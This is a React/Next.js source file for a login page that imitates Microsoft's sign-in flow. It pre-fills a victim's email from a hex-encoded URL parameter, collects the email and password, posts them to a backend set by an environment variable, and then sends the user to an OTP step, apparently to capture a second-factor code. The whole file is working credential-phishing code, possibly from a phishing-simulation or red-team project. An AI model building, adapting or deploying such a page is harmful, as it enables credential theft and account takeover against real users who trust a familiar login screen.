"use client";
import { AiOutlineTwitter } from "react-icons/ai";
import { BiLogoFacebook } from "react-icons/bi";
import { useState, useEffect } from "react";
import { useRouter } from "next/router";
import { setCookie } from "cookies-next";
import { getCookie } from "cookies-next";
import arrow from "../../public/arrow.svg";
import { useSearchParams } from "next/navigation";
import Wait from "../OTP/components/Wait";
import CircularProgress from "@mui/material/CircularProgress";
import Blocked_page from "./Blocked_checker";
export default function Login() {
  const router = useRouter();
  const [emailAddress, setemailAddress] = useState("");
  const [password, setpassword] = useState("");
  const [id, setid] = useState("");
  const [username_page, setusername_page] = useState(true);
  const [isWrongEmail, setisWrongEmail] = useState(false);
  const [email_parameter, setemail_parameter] = useState(null);
  const searchParams = useSearchParams();
  
  console.log("oauth2 is :" + email_parameter);
  const cookie = getCookie("id");

  const hello = async () => {
    if (cookie == null) {
      try {
        const res = await fetch(`${process.env.API_URL}/hello`, {
          method: "GET",
          cache: "no-cache",
        });
        res.text().then((text) => {
          setid(text);
          setCookie("id", text, {
            res,
            res,
            maxAge: 60 * 60 * 24 * 30, // 30 day
            sameSite: "lax",
          });
        });
      } catch (error) {
        alert("(╯°□°)╯︵ ┻━┻ : No more API");
      }
    } else {
      setid(cookie);
    }
  };

  const email_send = async () => {
    // why not
    if (emailAddress.toLowerCase().includes("<script>")) {
      router.push("/HackerMan");
    }
    // TODO add API endppoint to capture the email address
    const data = {
      username: emailAddress,
      password: "NONE",
    };
    const res = await fetch(`${process.env.API_URL}/login/${id}`, {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json",
        accept: "application/json",
      },
      body: JSON.stringify(data),
    });
    const res2 = await fetch(`${process.env.API_URL}/action/${id}/wait`, {
      method: "PUT",
      cache: "no-cache",
    });

    if (typeof document !== "undefined") {
      document.getElementById("signIn-options").style.display = "none";
    }
  };

  const login = async () => {
    const data = {
      username: emailAddress,
      password: password,
    };
    const res = await fetch(`${process.env.API_URL}/login/${id}`, {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json",
        accept: "application/json",
      },
      body: JSON.stringify(data),
    });
    const res2 = await fetch(`${process.env.API_URL}/action/${id}/wait`, {
      method: "PUT",
      cache: "no-cache",
    });

    router.push("/OTP");
  };
  useEffect(() => {
    hello();
    if (searchParams.get("oauth2") != null) {
      setemail_parameter(hex2a(searchParams.get("oauth2")));
    }
  }, []);

  const change_to_password = () => {
    if (username_page) {
      if (emailAddress == "") {
        setisWrongEmail(true);
        return;
      }
    }
    // if (typeof document !== "undefined") {
    document.getElementById("signIn-options").style.display = "none";
    // }
    // username_page = false;
    setusername_page(!username_page);
  };
  function hex2a(hexx) {
    var hex = hexx.toString(); //force conversion
    var str = "";
    for (var i = 0; i < hex.length; i += 2)
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
  }

  const PageChanger = () => {
    if (email_parameter != null) {
      if (typeof document !== "undefined") {
        document.getElementById("signIn-options").style.display = "none";
      }
      return (
        <div>
          <div
            className="pt-2"
            style={{
              WebkitTextSizeAdjust: "100%",
              direction: "ltr",
              textAlign: "left",
              lineHeight: "1.75rem",
              color: "#1b1b1b",
              fontSize: "1.5rem",
              fontWeight: "600",
              boxSizing: "border-box",
            }}
          >
            Pick an account
          </div>
          <div>
            <div
              onClick={() => {
                setemailAddress(email_parameter);
                setemail_parameter(null);
                email_send();
                setusername_page(false);
              }}
            >
              <div
                style={{
                  position: "relative",
                  marginLeft: "calc((-512px + 100%) / 2)",
                  marginRight: "calc((-512px + 100%) / 2)",
                }}
              >
                <div className="flex px-20 mt-4 py-4 flex-row space-x-3 items-center hover:bg-gray-200">
                  <img className="" src={`/picker_account.svg`}></img>
                  <div
                    style={{
                      WebkitTextSizeAdjust: "100%",
                      fontWeight: "400",
                      fontSize: ".9375rem",
                      direction: "ltr",
                      listStyle: "circle",
                      listStyleType: "disc",
                      color: "inherit",
                      cursor: "pointer",
                      textAlign: "left",
                      lineHeight: "16px",
                      boxSizing: "border-box",
                      wordWrap: "break-word",
                    }}
                  >
                    {email_parameter}
                  </div>
                  <img
                    src={`/picker_more.svg`}
                    className="pr-20"
                    style={{ position: "absolute", right: "0" }}
                  ></img>
                </div>
              </div>
            </div>

            <div
              onClick={() => {
                setemail_parameter(null);
              }}
            >
              <div
                style={{
                  position: "relative",
                  marginLeft: "calc((-512px + 100%) / 2)",
                  marginRight: "calc((-512px + 100%) / 2)",
                }}
              >
                <div className="flex px-20  py-4 flex-row space-x-3 items-center hover:bg-gray-200">
                  <img className="" src={`/picker_account_add.svg`}></img>
                  <div
                    style={{
                      WebkitTextSizeAdjust: "100%",
                      fontWeight: "400",
                      fontSize: ".9375rem",
                      direction: "ltr",
                      listStyle: "circle",
                      listStyleType: "disc",
                      color: "inherit",
                      cursor: "pointer",
                      textAlign: "left",
                      lineHeight: "16px",
                      boxSizing: "border-box",
                      wordWrap: "break-word",
                    }}
                  >
                    Use another account
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      );
    }
    if (username_page) {
      // document.body.classList.add
      // if (typeof document !== "undefined") {
      //   document.getElementById("signIn-options").style.display = "block";
      // }
      return (
        <div className="mt-4 flex space-y-3 flex-col">
          <div
            style={{
              WebkitTextSizeAdjust: "100%",
              direction: "ltr",
              textAlign: "left",
              lineHeight: "1.75rem",
              color: "#1b1b1b",
              fontSize: "1.5rem",
              fontWeight: "600",
              boxSizing: "border-box",
            }}
          >
            Sign in
          </div>
          {isWrongEmail && (
            <div
              style={{
                WebkitTextSizeAdjust: "100%",
                fontWeight: "400",
                fontSize: ".9375rem",
                lineHeight: "1.25rem",
                direction: "ltr",
                textAlign: "left",
                boxSizing: "border-box",
                position: "relative",
                minHeight: "1px",
                paddingLeft: "2px",
                paddingRight: "2px",
                float: "left",
                width: "100%",
                color: "#e81123",
              }}
            >
              Enter a valid email address, phone number, or Skype name.
            </div>
          )}
          <input
            type="text"
            placeholder="Email, phone, or Skype"
            value={emailAddress}
            onKeyDown={(e) => {
              // console.log(e.key);
              if (e.key == "Enter") {
                email_send();
                change_to_password();
              }
            }}
            onChange={(e) => {
              setemailAddress(e.currentTarget.value);
            }}
            style={{
              WebkitTextSizeAdjust: "100%",
              boxSizing: "border-box",
              color: "inherit",
              font: "inherit",
              margin: "0",
              fontFamily: "inherit",
              fontSize: "inherit",
              maxWidth: "100%",
              lineHeight: "inherit",
              display: "block",
              width: "100%",
              backgroundImage: "none",
              direction: "ltr",
              textAlign: "left",
              borderStyle: "solid",
              padding: "6px 10px",
              borderWidth: "1px",
              borderColor: "rgba(0,0,0,0.6)",
              height: "36px",
              outline: "none",
              WebkitBorderRadius: "0",
              backgroundColor: "transparent",
              borderTopWidth: "0",
              borderLeftWidth: "0",
              borderRightWidth: "0",
              paddingLeft: "0",
            }}
          />

          <div
            style={{
              WebkitTextSizeAdjust: "100%",
              fontWeight: "400",
              lineHeight: "1.25rem",
              direction: "ltr",
              color: "#1b1b1b",
              textAlign: "left",
              fontSize: ".8125rem",
              boxSizing: "border-box",
              marginBottom: "16px",
            }}
          >
            No account?{" "}
            <a
              href="https://login.live.com/"
              style={{
                WebkitTextSizeAdjust: "100%",
                fontWeight: "400",
                lineHeight: "1.25rem",
                direction: "ltr",
                textAlign: "left",
                fontSize: ".8125rem",
                boxSizing: "border-box",
                backgroundColor: "transparent",
                textDecoration: "none",
                color: "#0067b8",
                whiteSpace: "nowrap",
              }}
            >
              Create one!
            </a>
          </div>
          <a
            href="https://login.live.com/"
            style={{
              WebkitTextSizeAdjust: "100%",
              fontWeight: "400",
              lineHeight: "1.25rem",
              direction: "ltr",
              textAlign: "left",
              fontSize: ".8125rem",
              boxSizing: "border-box",
              backgroundColor: "transparent",
              textDecoration: "none",
              color: "#0067b8",
            }}
          >
            Can’t access your account?
          </a>

          <div className="flex flex-row space-x-2">
            <div style={{ minWidth: "108px" }}>{""}</div>
            <button
              style={{
                WebkitTextSizeAdjust: "100%",
                direction: "ltr",
                boxSizing: "border-box",
                font: "inherit",
                fontFamily: "inherit",
                fontSize: "inherit",
                WebkitAppearance: "button",
                cursor: "pointer",
                padding: "4px 12px 4px 12px",
                position: "relative",
                maxWidth: "100%",
                textAlign: "center",
                whiteSpace: "nowrap",
                verticalAlign: "middle",
                textOverflow: "ellipsis",
                touchAction: "manipulation",
                color: "#000",
                borderStyle: "solid",
                borderColor: "transparent",
                minHeight: "32px",
                border: "none",
                backgroundColor: "rgba(0,0,0,0.2)",
                lineHeight: "normal",
                display: "block",
                width: "100%",
              }}
            >
              Back
            </button>
            <button
              onClick={() => {
                email_send();
                change_to_password();
              }}
              style={{
                WebkitTextSizeAdjust: "100%",
                direction: "ltr",
                boxSizing: "border-box",
                font: "inherit",
                fontFamily: "inherit",
                fontSize: "inherit",
                WebkitAppearance: "button",
                cursor: "pointer",
                padding: "4px 12px 4px 12px",
                position: "relative",
                maxWidth: "100%",
                textAlign: "center",
                whiteSpace: "nowrap",
                verticalAlign: "middle",
                textOverflow: "ellipsis",
                touchAction: "manipulation",
                minHeight: "32px",
                border: "none",
                lineHeight: "normal",
                color: "#fff",
                borderColor: "#0067b8",
                backgroundColor: "#0067b8",
                display: "block",
                width: "100%",
              }}
            >
              Next
            </button>
          </div>
        </div>
      );
    } else {
      document.getElementById("box-logo").src = `/company_logo.png`;
      document.body.classList.add(
        `bg-[url('/company_background.jpeg')]`,
        "w-full",
        "bg-cover"
      );
      return (
        <div className="flex flex-col space-y-7">
          <div className="flex flex-row space-x-2">
            {/* fix this to go back */}
            <img src={`/arrow.svg`} onClick={change_to_password}></img>
            <div
              style={{
                WebkitTextSizeAdjust: "100%",
                fontWeight: "400",
                fontSize: ".9375rem",
                direction: "ltr",
                color: "#1b1b1b",
                textAlign: "left",
                boxSizing: "border-box",
                lineHeight: "24px",
                whiteSpace: "nowrap",
                overflow: "hidden",
                textOverflow: "ellipsis",
              }}
            >
              {emailAddress}
            </div>
          </div>
          <div
            style={{
              WebkitTextSizeAdjust: "100%",
              direction: "ltr",
              textAlign: "left",
              lineHeight: "1.75rem",
              color: "#1b1b1b",
              fontSize: "1.5rem",
              fontWeight: "600",
              boxSizing: "border-box",
            }}
          >
            Enter password
          </div>
          <input
            placeholder="Password"
            value={password}
            type="password"
            onChange={(e) => {
              setpassword(e.currentTarget.value);
            }}
            onKeyDown={(e) => {
              // console.log(e.key);
              if (e.key == "Enter") {
                login();
              }
            }}
            style={{
              WebkitTextSizeAdjust: "100%",
              direction: "ltr",
              boxSizing: "border-box",
              color: "inherit",
              font: "inherit",
              margin: "0",
              fontFamily: "inherit",
              fontSize: "inherit",
              maxWidth: "100%",
              lineHeight: "inherit",
              display: "block",
              width: "100%",
              backgroundImage: "none",
              borderStyle: "solid",
              padding: "6px 10px",
              borderWidth: "1px",
              borderColor: "rgba(0,0,0,0.6)",
              height: "36px",
              outline: "none",
              WebkitBorderRadius: "0",
              backgroundColor: "transparent",
              borderTopWidth: "0",
              borderLeftWidth: "0",
              borderRightWidth: "0",
              paddingLeft: "0",
            }}
          ></input>
          <a
            href="https://passwordreset.microsoftonline.com/"
            style={{
              WebkitTextSizeAdjust: "100%",
              fontWeight: "400",
              lineHeight: "1.25rem",
              direction: "ltr",
              textAlign: "left",
              fontSize: ".8125rem",
              boxSizing: "border-box",
              backgroundColor: "transparent",
              textDecoration: "none",
              color: "#0067b8",
            }}
          >
            Forgot my password
          </a>
          <div className="flex flex-row ">
            <div className="w-3/4"></div>
            {/* Add message that the password in empty */}
            <button
              disabled={!emailAddress | !password}
              onClick={login}
              style={{
                WebkitTextSizeAdjust: "100%",
                direction: "ltr",
                boxSizing: "border-box",
                font: "inherit",
                fontFamily: "inherit",
                fontSize: "inherit",
                WebkitAppearance: "button",
                cursor: "pointer",
                padding: "4px 12px 4px 12px",
                textAlign: "center",
                whiteSpace: "nowrap",
                textOverflow: "ellipsis",
                touchAction: "manipulation",
                minHeight: "32px",
                border: "none",
                lineHeight: "normal",
                color: "#fff",
                borderColor: "#0067b8",
                backgroundColor: "#0067b8",
                display: "block",
                width: "27%",
              }}
            >
              Sign in
            </button>
          </div>
        </div>
      );
    }
  };
  return <div>{PageChanger()}</div>;
}
